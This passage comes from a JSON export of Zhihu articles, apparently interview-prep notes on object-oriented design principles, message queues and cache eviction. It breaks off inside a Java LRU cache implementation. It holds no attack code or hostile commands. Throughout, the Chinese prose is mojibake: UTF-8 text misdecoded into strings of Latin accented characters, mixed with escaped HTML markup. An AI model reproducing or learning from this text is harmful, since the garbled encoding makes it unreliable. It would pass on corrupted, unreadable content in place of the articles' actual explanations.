ç±»åº”è¯¥å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚<br/> </blockquote><p>æ‰©å±•å°±æ˜¯æ·»åŠ æ–°åŠŸèƒ½çš„æ„æ€ï¼Œå› æ­¤è¯¥åŸåˆ™è¦æ±‚åœ¨æ·»åŠ æ–°åŠŸèƒ½æ—¶ä¸éœ€è¦ä¿®æ”¹ä»£ç ã€‚</p><p>ç¬¦åˆå¼€é—­åŸåˆ™æœ€å…¸å‹çš„è®¾è®¡æ¨¡å¼æ˜¯è£…é¥°è€…æ¨¡å¼ï¼Œå®ƒå¯ä»¥åŠ¨æ€åœ°å°†è´£ä»»é™„åŠ åˆ°å¯¹è±¡ä¸Šï¼Œè€Œä¸ç”¨å»ä¿®æ”¹ç±»çš„ä»£ç ã€‚</p><h3>3. é‡Œæ°æ›¿æ¢åŸåˆ™</h3><blockquote> å­ç±»å¯¹è±¡å¿…é¡»èƒ½å¤Ÿæ›¿æ¢æ‰æ‰€æœ‰çˆ¶ç±»å¯¹è±¡ã€‚<br/> </blockquote><p>ç»§æ‰¿æ˜¯ä¸€ç§ IS-A å…³ç³»ï¼Œå­ç±»éœ€è¦èƒ½å¤Ÿå½“æˆçˆ¶ç±»æ¥ä½¿ç”¨ï¼Œå¹¶ä¸”éœ€è¦æ¯”çˆ¶ç±»æ›´ç‰¹æ®Šã€‚</p><p>å¦‚æœä¸æ»¡è¶³è¿™ä¸ªåŸåˆ™ï¼Œé‚£ä¹ˆå„ä¸ªå­ç±»çš„è¡Œä¸ºä¸Šå°±ä¼šæœ‰å¾ˆå¤§å·®å¼‚ï¼Œå¢åŠ ç»§æ‰¿ä½“ç³»çš„å¤æ‚åº¦ã€‚</p><h3>4. æ¥å£åˆ†ç¦»åŸåˆ™</h3><blockquote> ä¸åº”è¯¥å¼ºè¿«å®¢æˆ·ä¾èµ–äºå®ƒä»¬ä¸ç”¨çš„æ–¹æ³•ã€‚<br/> </blockquote><p>å› æ­¤ä½¿ç”¨å¤šä¸ªä¸“é—¨çš„æ¥å£æ¯”ä½¿ç”¨å•ä¸€çš„æ€»æ¥å£è¦å¥½ã€‚</p><h3>5. ä¾èµ–å€’ç½®åŸåˆ™</h3><blockquote> é«˜å±‚æ¨¡å—ä¸åº”è¯¥ä¾èµ–äºä½å±‚æ¨¡å—ï¼ŒäºŒè€…éƒ½åº”è¯¥ä¾èµ–äºæŠ½è±¡ï¼›<br/>æŠ½è±¡ä¸åº”è¯¥ä¾èµ–äºç»†èŠ‚ï¼Œç»†èŠ‚åº”è¯¥ä¾èµ–äºæŠ½è±¡ã€‚<br/> </blockquote><p>é«˜å±‚æ¨¡å—åŒ…å«ä¸€ä¸ªåº”ç”¨ç¨‹åºä¸­é‡è¦çš„ç­–ç•¥é€‰æ‹©å’Œä¸šåŠ¡æ¨¡å—ï¼Œå¦‚æœé«˜å±‚æ¨¡å—ä¾èµ–äºä½å±‚æ¨¡å—ï¼Œé‚£ä¹ˆä½å±‚æ¨¡å—çš„æ”¹åŠ¨å°±ä¼šç›´æ¥å½±å“åˆ°é«˜å±‚æ¨¡å—ï¼Œä»è€Œè¿«ä½¿é«˜å±‚æ¨¡å—ä¹Ÿéœ€è¦æ”¹åŠ¨ã€‚</p><p>ä¾èµ–äºæŠ½è±¡æ„å‘³ç€ï¼š</p><ul><li>ä»»ä½•å˜é‡éƒ½ä¸åº”è¯¥æŒæœ‰ä¸€ä¸ªæŒ‡å‘å…·ä½“ç±»çš„æŒ‡é’ˆæˆ–è€…å¼•ç”¨ï¼›</li><li>ä»»ä½•ç±»éƒ½ä¸åº”è¯¥ä»å…·ä½“ç±»æ´¾ç”Ÿï¼›</li><li>ä»»ä½•æ–¹æ³•éƒ½ä¸åº”è¯¥è¦†å†™å®ƒçš„ä»»ä½•åŸºç±»ä¸­çš„å·²ç»å®ç°çš„æ–¹æ³•ã€‚</li></ul><h2>å…¶ä»–å¸¸è§åŸåˆ™</h2><p>é™¤äº†ä¸Šè¿°çš„ç»å…¸åŸåˆ™ï¼Œåœ¨å®é™…å¼€å‘ä¸­è¿˜æœ‰ä¸‹é¢è¿™äº›å¸¸è§çš„è®¾è®¡åŸåˆ™ã€‚</p><p>| ç®€å†™    | å…¨æ‹¼    | ä¸­æ–‡ç¿»è¯‘ | | :--: | :--: | :--: | |LOD|    The Law of Demeter                   | è¿ªç±³ç‰¹æ³•åˆ™   | |CRP|    The Composite Reuse Principle        | åˆæˆå¤ç”¨åŸåˆ™ | |CCP|    The Common Closure Principle         | å…±åŒå°é—­åŸåˆ™ | |SAP|    The Stable Abstractions Principle    | ç¨³å®šæŠ½è±¡åŸåˆ™ | |SDP|    The Stable Dependencies Principle    | ç¨³å®šä¾èµ–åŸåˆ™ |</p><h3>1. è¿ªç±³ç‰¹æ³•åˆ™</h3><p>è¿ªç±³ç‰¹æ³•åˆ™åˆå«ä½œæœ€å°‘çŸ¥è¯†åŸåˆ™ï¼ˆLeast Knowledge Principleï¼Œç®€å†™ LKPï¼‰ï¼Œå°±æ˜¯è¯´ä¸€ä¸ªå¯¹è±¡åº”å½“å¯¹å…¶ä»–å¯¹è±¡æœ‰å°½å¯èƒ½å°‘çš„äº†è§£ï¼Œä¸å’Œé™Œç”Ÿäººè¯´è¯ã€‚</p><h3>2. åˆæˆå¤ç”¨åŸåˆ™</h3><p>å°½é‡ä½¿ç”¨å¯¹è±¡ç»„åˆï¼Œè€Œä¸æ˜¯é€šè¿‡ç»§æ‰¿æ¥è¾¾åˆ°å¤ç”¨çš„ç›®çš„ã€‚</p><h3>3. å…±åŒå°é—­åŸåˆ™</h3><p>ä¸€èµ·ä¿®æ”¹çš„ç±»ï¼Œåº”è¯¥ç»„åˆåœ¨ä¸€èµ·ï¼ˆåŒä¸€ä¸ªåŒ…é‡Œï¼‰ã€‚å¦‚æœå¿…é¡»ä¿®æ”¹åº”ç”¨ç¨‹åºé‡Œçš„ä»£ç ï¼Œæˆ‘ä»¬å¸Œæœ›æ‰€æœ‰çš„ä¿®æ”¹éƒ½å‘ç”Ÿåœ¨ä¸€ä¸ªåŒ…é‡Œï¼ˆä¿®æ”¹å…³é—­ï¼‰ï¼Œè€Œä¸æ˜¯éå¸ƒåœ¨å¾ˆå¤šåŒ…é‡Œã€‚</p><h3>4. ç¨³å®šæŠ½è±¡åŸåˆ™</h3><p>æœ€ç¨³å®šçš„åŒ…åº”è¯¥æ˜¯æœ€æŠ½è±¡çš„åŒ…ï¼Œä¸ç¨³å®šçš„åŒ…åº”è¯¥æ˜¯å…·ä½“çš„åŒ…ï¼Œå³åŒ…çš„æŠ½è±¡ç¨‹åº¦è·Ÿå®ƒçš„ç¨³å®šæ€§æˆæ­£æ¯”ã€‚</p><h3>5. ç¨³å®šä¾èµ–åŸåˆ™</h3><p>åŒ…ä¹‹é—´çš„ä¾èµ–å…³ç³»éƒ½åº”è¯¥æ˜¯ç¨³å®šæ–¹å‘ä¾èµ–çš„ï¼ŒåŒ…è¦ä¾èµ–çš„åŒ…è¦æ¯”è‡ªå·±æ›´å…·æœ‰ç¨³å®šæ€§ã€‚</p><h2>å‚è€ƒèµ„æ–™</h2><ul><li>Java ç¼–ç¨‹æ€æƒ³</li><li>æ•æ·è½¯ä»¶å¼€å‘ï¼šåŸåˆ™ã€æ¨¡å¼ä¸å®è·µ</li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.cnblogs.com/shanyou/archive/2009/09/21/1570716.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">é¢å‘å¯¹è±¡è®¾è®¡çš„ SOLID åŸåˆ™</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//design-patterns.readthedocs.io/zh_CN/latest/read_uml.html%23generalization\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">çœ‹æ‡‚ UML ç±»å›¾å’Œæ—¶åºå›¾</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.cnblogs.com/wolf-sun/p/UML-Sequence-diagram.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">UML ç³»åˆ—â€”â€”æ—¶åºå›¾ï¼ˆé¡ºåºå›¾ï¼‰sequence diagram</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//blog.csdn.net/jianyuerensheng/article/details/51602015\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸‰å¤§ç‰¹æ€§ ------ å°è£…ã€ç»§æ‰¿ã€å¤šæ€</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "é¢å‘å¯¹è±¡ç¼–ç¨‹", 
                    "tagLink": "https://api.zhihu.com/topics/19569910"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68529374", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "æ¶ˆæ¯é˜Ÿåˆ—", 
            "content": "<p></p><h2>ä¸€ã€æ¶ˆæ¯æ¨¡å‹</h2><h2>ç‚¹å¯¹ç‚¹</h2><p>æ¶ˆæ¯ç”Ÿäº§è€…å‘æ¶ˆæ¯é˜Ÿåˆ—ä¸­å‘é€äº†ä¸€ä¸ªæ¶ˆæ¯ä¹‹åï¼Œåªèƒ½è¢«ä¸€ä¸ªæ¶ˆè´¹è€…æ¶ˆè´¹ä¸€æ¬¡ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-5ea1e6953df65d1714f560c5c3f7ae38_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"717\" data-rawheight=\"283\" class=\"origin_image zh-lightbox-thumb\" width=\"717\" data-original=\"https://pic1.zhimg.com/v2-5ea1e6953df65d1714f560c5c3f7ae38_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;717&#39; height=&#39;283&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"717\" data-rawheight=\"283\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"717\" data-original=\"https://pic1.zhimg.com/v2-5ea1e6953df65d1714f560c5c3f7ae38_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-5ea1e6953df65d1714f560c5c3f7ae38_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å‘å¸ƒ/è®¢é˜…</h2><p>æ¶ˆæ¯ç”Ÿäº§è€…å‘é¢‘é“å‘é€ä¸€ä¸ªæ¶ˆæ¯ä¹‹åï¼Œå¤šä¸ªæ¶ˆè´¹è€…å¯ä»¥ä»è¯¥é¢‘é“è®¢é˜…åˆ°è¿™æ¡æ¶ˆæ¯å¹¶æ¶ˆè´¹ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-d7bf5b9fc78595a22998b3eaddfe78ab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"266\" class=\"origin_image zh-lightbox-thumb\" width=\"720\" data-original=\"https://pic4.zhimg.com/v2-d7bf5b9fc78595a22998b3eaddfe78ab_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;720&#39; height=&#39;266&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"266\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"720\" data-original=\"https://pic4.zhimg.com/v2-d7bf5b9fc78595a22998b3eaddfe78ab_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-d7bf5b9fc78595a22998b3eaddfe78ab_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å‘å¸ƒä¸è®¢é˜…æ¨¡å¼å’Œè§‚å¯Ÿè€…æ¨¡å¼æœ‰ä»¥ä¸‹ä¸åŒï¼š</p><ul><li>è§‚å¯Ÿè€…æ¨¡å¼ä¸­ï¼Œè§‚å¯Ÿè€…å’Œä¸»é¢˜éƒ½çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ï¼›è€Œåœ¨å‘å¸ƒä¸è®¢é˜…æ¨¡å¼ä¸­ï¼Œç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…ä¸çŸ¥é“å¯¹æ–¹çš„å­˜åœ¨ï¼Œå®ƒä»¬ä¹‹é—´é€šè¿‡é¢‘é“è¿›è¡Œé€šä¿¡ã€‚</li><li>è§‚å¯Ÿè€…æ¨¡å¼æ˜¯åŒæ­¥çš„ï¼Œå½“äº‹ä»¶è§¦å‘æ—¶ï¼Œä¸»é¢˜ä¼šè°ƒç”¨è§‚å¯Ÿè€…çš„æ–¹æ³•ï¼Œç„¶åç­‰å¾…æ–¹æ³•è¿”å›ï¼›è€Œå‘å¸ƒä¸è®¢é˜…æ¨¡å¼æ˜¯å¼‚æ­¥çš„ï¼Œç”Ÿäº§è€…å‘é¢‘é“å‘é€ä¸€ä¸ªæ¶ˆæ¯ä¹‹åï¼Œå°±ä¸éœ€è¦å…³å¿ƒæ¶ˆè´¹è€…ä½•æ—¶å»è®¢é˜…è¿™ä¸ªæ¶ˆæ¯ï¼Œå¯ä»¥ç«‹å³è¿”å›ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-217cd72a6c43eacaed822390b865920b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"654\" data-rawheight=\"465\" class=\"origin_image zh-lightbox-thumb\" width=\"654\" data-original=\"https://pic4.zhimg.com/v2-217cd72a6c43eacaed822390b865920b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;654&#39; height=&#39;465&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"654\" data-rawheight=\"465\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"654\" data-original=\"https://pic4.zhimg.com/v2-217cd72a6c43eacaed822390b865920b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-217cd72a6c43eacaed822390b865920b_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>äºŒã€ä½¿ç”¨åœºæ™¯</h2><h2>å¼‚æ­¥å¤„ç†</h2><p>å‘é€è€…å°†æ¶ˆæ¯å‘é€ç»™æ¶ˆæ¯é˜Ÿåˆ—ä¹‹åï¼Œä¸éœ€è¦åŒæ­¥ç­‰å¾…æ¶ˆæ¯æ¥æ”¶è€…å¤„ç†å®Œæ¯•ï¼Œè€Œæ˜¯ç«‹å³è¿”å›è¿›è¡Œå…¶å®ƒæ“ä½œã€‚æ¶ˆæ¯æ¥æ”¶è€…ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è®¢é˜…æ¶ˆæ¯ä¹‹åå¼‚æ­¥å¤„ç†ã€‚</p><p>ä¾‹å¦‚åœ¨æ³¨å†Œæµç¨‹ä¸­é€šå¸¸éœ€è¦å‘é€éªŒè¯é‚®ä»¶æ¥ç¡®ä¿æ³¨å†Œç”¨æˆ·èº«ä»½çš„åˆæ³•æ€§ï¼Œå¯ä»¥ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ä½¿å‘é€éªŒè¯é‚®ä»¶çš„æ“ä½œå¼‚æ­¥å¤„ç†ï¼Œç”¨æˆ·åœ¨å¡«å†™å®Œæ³¨å†Œä¿¡æ¯ä¹‹åå°±å¯ä»¥å®Œæˆæ³¨å†Œï¼Œè€Œå°†å‘é€éªŒè¯é‚®ä»¶è¿™ä¸€æ¶ˆæ¯å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚</p><p>åªæœ‰åœ¨ä¸šåŠ¡æµç¨‹å…è®¸å¼‚æ­¥å¤„ç†çš„æƒ…å†µä¸‹æ‰èƒ½è¿™ä¹ˆåšï¼Œä¾‹å¦‚ä¸Šé¢çš„æ³¨å†Œæµç¨‹ä¸­ï¼Œå¦‚æœè¦æ±‚ç”¨æˆ·å¯¹éªŒè¯é‚®ä»¶è¿›è¡Œç‚¹å‡»ä¹‹åæ‰èƒ½å®Œæˆæ³¨å†Œçš„è¯ï¼Œå°±ä¸èƒ½å†ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ã€‚</p><h2>æµé‡å‰Šé”‹</h2><p>åœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸‹ï¼Œå¦‚æœçŸ­æ—¶é—´æœ‰å¤§é‡çš„è¯·æ±‚åˆ°è¾¾ä¼šå‹å®æœåŠ¡å™¨ã€‚</p><p>å¯ä»¥å°†è¯·æ±‚å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼ŒæœåŠ¡å™¨æŒ‰ç…§å…¶å¤„ç†èƒ½åŠ›ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è®¢é˜…æ¶ˆæ¯è¿›è¡Œå¤„ç†ã€‚</p><h2>åº”ç”¨è§£è€¦</h2><p>å¦‚æœæ¨¡å—ä¹‹é—´ä¸ç›´æ¥è¿›è¡Œè°ƒç”¨ï¼Œæ¨¡å—ä¹‹é—´è€¦åˆåº¦å°±ä¼šå¾ˆä½ï¼Œé‚£ä¹ˆä¿®æ”¹ä¸€ä¸ªæ¨¡å—æˆ–è€…æ–°å¢ä¸€ä¸ªæ¨¡å—å¯¹å…¶å®ƒæ¨¡å—çš„å½±å“ä¼šå¾ˆå°ï¼Œä»è€Œå®ç°å¯æ‰©å±•æ€§ã€‚</p><p>é€šè¿‡ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼Œä¸€ä¸ªæ¨¡å—åªéœ€è¦å‘æ¶ˆæ¯é˜Ÿåˆ—ä¸­å‘é€æ¶ˆæ¯ï¼Œå…¶å®ƒæ¨¡å—å¯ä»¥é€‰æ‹©æ€§åœ°ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è®¢é˜…æ¶ˆæ¯ä»è€Œå®Œæˆè°ƒç”¨ã€‚</p><h2>ä¸‰ã€å¯é æ€§</h2><h2>å‘é€ç«¯çš„å¯é æ€§</h2><p>å‘é€ç«¯å®Œæˆæ“ä½œåä¸€å®šèƒ½å°†æ¶ˆæ¯æˆåŠŸå‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚</p><p>å®ç°æ–¹æ³•ï¼šåœ¨æœ¬åœ°æ•°æ®åº“å»ºä¸€å¼ æ¶ˆæ¯è¡¨ï¼Œå°†æ¶ˆæ¯æ•°æ®ä¸ä¸šåŠ¡æ•°æ®ä¿å­˜åœ¨åŒä¸€æ•°æ®åº“å®ä¾‹é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨æœ¬åœ°æ•°æ®åº“çš„äº‹åŠ¡æœºåˆ¶ã€‚äº‹åŠ¡æäº¤æˆåŠŸåï¼Œå°†æ¶ˆæ¯è¡¨ä¸­çš„æ¶ˆæ¯è½¬ç§»åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œè‹¥è½¬ç§»æ¶ˆæ¯æˆåŠŸåˆ™åˆ é™¤æ¶ˆæ¯è¡¨ä¸­çš„æ•°æ®ï¼Œå¦åˆ™ç»§ç»­é‡ä¼ ã€‚</p><h2>æ¥æ”¶ç«¯çš„å¯é æ€§</h2><p>æ¥æ”¶ç«¯èƒ½å¤Ÿä»æ¶ˆæ¯é˜Ÿåˆ—æˆåŠŸæ¶ˆè´¹ä¸€æ¬¡æ¶ˆæ¯ã€‚</p><p>ä¸¤ç§å®ç°æ–¹æ³•ï¼š</p><ul><li>ä¿è¯æ¥æ”¶ç«¯å¤„ç†æ¶ˆæ¯çš„ä¸šåŠ¡é€»è¾‘å…·æœ‰å¹‚ç­‰æ€§ï¼šåªè¦å…·æœ‰å¹‚ç­‰æ€§ï¼Œé‚£ä¹ˆæ¶ˆè´¹å¤šå°‘æ¬¡æ¶ˆæ¯ï¼Œæœ€åå¤„ç†çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ã€‚</li><li>ä¿è¯æ¶ˆæ¯å…·æœ‰å”¯ä¸€ç¼–å·ï¼Œå¹¶ä½¿ç”¨ä¸€å¼ æ—¥å¿—è¡¨æ¥è®°å½•å·²ç»æ¶ˆè´¹çš„æ¶ˆæ¯ç¼–å·ã€‚</li></ul><h2>å‚è€ƒèµ„æ–™</h2><ul><li><a href=\"https://link.zhihu.com/?target=http%3A//developers-club.com/posts/270339/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Observer vs Pub-Sub</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//blog.csdn.net/lizhitao/article/details/47723105\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ¶ˆæ¯é˜Ÿåˆ—ä¸­ç‚¹å¯¹ç‚¹ä¸å‘å¸ƒè®¢é˜…åŒºåˆ«</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "æ¶ˆæ¯é˜Ÿåˆ—", 
                    "tagLink": "https://api.zhihu.com/topics/19708788"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68529269", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "ç¼“å­˜", 
            "content": "<p></p><h2>å‘½ä¸­ç‡</h2><p>å½“æŸä¸ªè¯·æ±‚èƒ½å¤Ÿé€šè¿‡è®¿é—®ç¼“å­˜è€Œå¾—åˆ°å“åº”æ—¶ï¼Œç§°ä¸ºç¼“å­˜å‘½ä¸­ã€‚</p><p>ç¼“å­˜å‘½ä¸­ç‡è¶Šé«˜ï¼Œç¼“å­˜çš„åˆ©ç”¨ç‡ä¹Ÿå°±è¶Šé«˜ã€‚</p><h2>æœ€å¤§ç©ºé—´</h2><p>ç¼“å­˜é€šå¸¸ä½äºå†…å­˜ä¸­ï¼Œå†…å­˜çš„ç©ºé—´é€šå¸¸æ¯”ç£ç›˜ç©ºé—´å°çš„å¤šï¼Œå› æ­¤ç¼“å­˜çš„æœ€å¤§ç©ºé—´ä¸å¯èƒ½éå¸¸å¤§ã€‚</p><p>å½“ç¼“å­˜å­˜æ”¾çš„æ•°æ®é‡è¶…è¿‡æœ€å¤§ç©ºé—´æ—¶ï¼Œå°±éœ€è¦æ·˜æ±°éƒ¨åˆ†æ•°æ®æ¥å­˜æ”¾æ–°åˆ°è¾¾çš„æ•°æ®ã€‚</p><h2>æ·˜æ±°ç­–ç•¥</h2><ul><li> FIFOï¼ˆFirst In First Outï¼‰ï¼šå…ˆè¿›å…ˆå‡ºç­–ç•¥ï¼Œåœ¨å®æ—¶æ€§çš„åœºæ™¯ä¸‹ï¼Œéœ€è¦ç»å¸¸è®¿é—®æœ€æ–°çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨ FIFOï¼Œä½¿å¾—æœ€å…ˆè¿›å…¥çš„æ•°æ®ï¼ˆæœ€æ™šçš„æ•°æ®ï¼‰è¢«æ·˜æ±°ã€‚<br/> </li><li> LRUï¼ˆLeast Recently Usedï¼‰ï¼šæœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ç­–ç•¥ï¼Œä¼˜å…ˆæ·˜æ±°æœ€ä¹…æœªä½¿ç”¨çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ä¸Šæ¬¡è¢«è®¿é—®æ—¶é—´è·ç¦»ç°åœ¨æœ€ä¹…çš„æ•°æ®ã€‚è¯¥ç­–ç•¥å¯ä»¥ä¿è¯å†…å­˜ä¸­çš„æ•°æ®éƒ½æ˜¯çƒ­ç‚¹æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ç»å¸¸è¢«è®¿é—®çš„æ•°æ®ï¼Œä»è€Œä¿è¯ç¼“å­˜å‘½ä¸­ç‡ã€‚<br/> </li><li> LFUï¼ˆLeast Frequently Usedï¼‰ï¼šæœ€ä¸ç»å¸¸ä½¿ç”¨ç­–ç•¥ï¼Œä¼˜å…ˆæ·˜æ±°ä¸€æ®µæ—¶é—´å†…ä½¿ç”¨æ¬¡æ•°æœ€å°‘çš„æ•°æ®ã€‚<br/> </li></ul><h2>äºŒã€LRU</h2><p>ä»¥ä¸‹æ˜¯åŸºäº åŒå‘é“¾è¡¨ + HashMap çš„ LRU ç®—æ³•å®ç°ï¼Œå¯¹ç®—æ³•çš„è§£é‡Šå¦‚ä¸‹ï¼š</p><ul><li>è®¿é—®æŸä¸ªèŠ‚ç‚¹æ—¶ï¼Œå°†å…¶ä»åŸæ¥çš„ä½ç½®åˆ é™¤ï¼Œå¹¶é‡æ–°æ’å…¥åˆ°é“¾è¡¨å¤´éƒ¨ã€‚è¿™æ ·å°±èƒ½ä¿è¯é“¾è¡¨å°¾éƒ¨å­˜å‚¨çš„å°±æ˜¯æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨çš„èŠ‚ç‚¹ï¼Œå½“èŠ‚ç‚¹æ•°é‡å¤§äºç¼“å­˜æœ€å¤§ç©ºé—´æ—¶å°±æ·˜æ±°é“¾è¡¨å°¾éƒ¨çš„èŠ‚ç‚¹ã€‚</li><li>ä¸ºäº†ä½¿åˆ é™¤æ“ä½œæ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼Œå°±ä¸èƒ½é‡‡ç”¨éå†çš„æ–¹å¼æ‰¾åˆ°æŸä¸ªèŠ‚ç‚¹ã€‚HashMap å­˜å‚¨ç€ Key åˆ°èŠ‚ç‚¹çš„æ˜ å°„ï¼Œé€šè¿‡ Key å°±èƒ½ä»¥ O(1) çš„æ—¶é—´å¾—åˆ°èŠ‚ç‚¹ï¼Œç„¶åå†ä»¥ O(1) çš„æ—¶é—´å°†å…¶ä»åŒå‘é˜Ÿåˆ—ä¸­åˆ é™¤ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">LRU</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span> <span class=\"n\">V</span><span class=\"o\">&gt;</span> <span class=\"kd\">implements</span> <span class=\"n\">Iterable</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">&gt;</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"n\">Node</span> <span class=\"n\">head</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"n\">Node</span> <span class=\"n\">tail</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"n\">HashMap</span><span class=\"o\">&lt;</span><span class=\"n\">K</span><span class=\"o\">,</span> <span class=\"n\">Node</span><span class=\"o\">&gt;</span> <span class=\"n\">map</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">maxSize</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">class</span> <span class=\"nc\">Node</span> <span class=\"o\">{</span>\n\n        <span class=\"n\">Node</span> <span class=\"n\">pre</span><span class=\"o\">;</span>\n        <span class=\"n\">Node</span> <span class=\"n\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">K</span> <span class=\"n\">k</span><span class=\"o\">;</span>\n        <span 